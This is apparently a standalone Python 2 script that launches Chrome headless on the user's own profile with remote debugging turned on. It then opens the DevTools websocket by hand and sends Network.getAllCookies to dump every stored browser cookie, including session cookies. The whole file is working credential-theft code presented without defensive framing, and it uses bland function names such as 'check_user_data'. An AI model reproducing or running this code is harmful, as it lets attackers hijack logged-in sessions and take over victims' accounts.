import signal
import time
import json
import subprocess
import urllib2
import socket
import hashlib
import base64
import struct
import os

PROFILE_NAME = "Default"
REMOTE_DEBUGGING_PORT = 9222
CHROME_CMD = "C:\Program Files\Google\Chrome\Application\chrome.exe"
USER_DATA_DIR = os.environ.get('localappdata') + r"\Google\Chrome\User Data"
GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"})
chrome_args = [
    "https://gmail.com",  # Or any other URL
    "--headless",
    """--user-data-dir="{user_data_dir}" """.format(user_data_dir=USER_DATA_DIR),
    "--remote-allow-origins=http://127.0.0.1:{}".format(REMOTE_DEBUGGING_PORT),
    "--remote-debugging-port={}".format(REMOTE_DEBUGGING_PORT),
]
CHROME_DEBUGGING_CMD = [CHROME_CMD] + chrome_args
CHROME_DEBUGGING_CMD = " ".join(CHROME_DEBUGGING_CMD)


def escape(s):
    return s.replace(" ", "\ ")


def url_parse(ws_url):
    server = "127.0.0.1"
    port = 9222
    url = ""

    protocol, rest = ws_url.split("://", 1)
    server, port_and_path = rest.split(":", 1)
    if "/" in port_and_path:
        port, url = port_and_path.split("/", 1)
        port = int(port)
    else:
        port = int(port_and_path)
    return server, port, url


# WebSocket
def manage_websocket(client_socket, ws_url, data):
    if not client_socket:
        return None

    server, port, url = url_parse(ws_url)

    key = base64.b64encode(hashlib.sha1('websocket-key').digest())
    request = (
        "GET /{} HTTP/1.1\r\n"
        "Host: {}:{}\r\n"
        "Upgrade: websocket\r\n"
        "Origin: http://{}:{}\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: {}\r\n"
        "Sec-WebSocket-Version: 13\r\n\r\n"
    ).format(url, server, port, server, port, key)

    # Connect to the server
    client_socket.connect((server, port))
    # Send handshake request
    client_socket.send(request.encode('utf-8'))
    # Receive websocket handshake response
    response = client_socket.recv(1024).decode('utf-8')
    if " 101 " not in response:
        client_socket.close()
        return None
    else:
        pass

    # Create a WebSocket frame for sending JSON data with masking
    frame = bytearray([0x81, 0x80 ^ len(data)])  # FIN bit set and text frame opcode

    # Mask the payload
    mask = struct.pack('!I', 0xbbe77c46)
    frame.extend(mask)
    masked_payload = bytearray()
    for i in range(len(data)):
        masked_payload.append(ord(data[i]) ^ ord(mask[i % 4]))

    # Append the masked payload to the frame
    frame.extend(masked_payload)

    # Send the WebSocket frame with masked JSON data
    client_socket.send(bytes(frame))

    cookies = received_json = ""

    # Receive and process WebSocket messages here
    frame = bytearray(client_socket.recv(2))

    # Get the payload length and mask bit
    payload_len = frame[1] & 0x7F
    masked = frame[1] & 0x80
    if payload_len == 126:
        payload_len = struct.unpack('!H', client_socket.recv(2))[0]
    elif payload_len == 127:
        payload_len = struct.unpack('!Q', client_socket.recv(8))[0]

    if masked:
        mask = bytearray(client_socket.recv(4))
        data = bytearray(client_socket.recv(payload_len))
        for i in range(payload_len):
            data[i] = data[i] ^ mask[i % 4]

    while True:
        data = bytearray(client_socket.recv(payload_len))

        # Handle the received data (JSON in this case)
        if data:
            received_json = data.decode('utf-8')

        cookies = cookies + received_json

        if "}]}}" in received_json:
            break

    # Close the socket when done
    client_socket.close()

    return cookies


def call_protocol():
    process = subprocess.Popen(CHROME_DEBUGGING_CMD, shell=False)
    time.sleep(3)
    return process


def get_websocket_url():
    response = urllib2.urlopen("http://127.0.0.1:{port}/json".format(port=REMOTE_DEBUGGING_PORT))
    websocket_url = json.loads(response.read())[0]["webSocketDebuggerUrl"]
    return websocket_url


def get_cookies(ws_url):
    ws_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        cookies = manage_websocket(ws_socket, ws_url, GET_ALL_COOKIES_REQUEST)
    except Exception as e:
        return None

    response = json.loads(r"{}".format(cookies))
    cookies = response["result"]["cookies"]

    return cookies

#def aaaaaaaaaaaaaaa(p):
#    pi = p.pid
#    os.kill(pi, signal.SIGTERM)

def check_user_data():
    process = call_protocol()
    time.sleep(5)
    websocket_url = get_websocket_url()
    cookies = get_cookies(websocket_url)

    time.sleep(1)
    # aaaaaaaaaaaaaaa(process)
    print(json.dumps(cookies, indent=4, separators=(',', ': '), sort_keys=True))

check_user_data()
